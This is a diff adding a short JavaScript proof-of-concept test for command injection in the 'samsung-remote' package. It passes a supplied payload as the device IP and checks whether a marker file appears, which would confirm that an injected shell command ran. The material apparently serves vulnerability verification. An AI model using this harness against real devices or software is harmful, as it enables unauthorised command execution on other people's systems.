@@ -1,0 +1,30 @@
+function exploitFunction(payload) {
+  const SamsungRemote = require("samsung-remote");
+  const fs = require("fs");
+  const path = "./samsung-remote";
+
+  try {
+    if (fs.existsSync(path)) {
+      fs.unlinkSync(path);
+      console.log("File removed:", path);
+    }
+  } catch (err) {
+    console.error(err);
+  }
+
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+
+  var remote = new SamsungRemote({ ip: payload });
+
+  remote.isAlive(function (err) {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, function (err) {
+      // The done callback is used to signal the test completion
+      if (err) throw err;
+    });
+  });
+}
+
+module.exports = { exploitFunction };
